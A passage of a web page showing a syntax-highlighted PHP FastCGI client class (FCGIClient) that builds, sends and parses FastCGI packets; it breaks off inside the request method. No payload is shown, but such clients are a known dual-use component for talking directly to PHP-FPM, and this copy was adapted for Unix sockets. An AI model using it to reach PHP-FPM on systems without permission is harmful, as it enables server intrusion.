class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="built_in">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9000</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="keyword">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[substr(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = substr(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = ord(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = ord(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (ord(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (ord(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = ord(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = ord(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="built_in">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;decodePacketHeader(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= strlen(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::GET_VALUES, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span 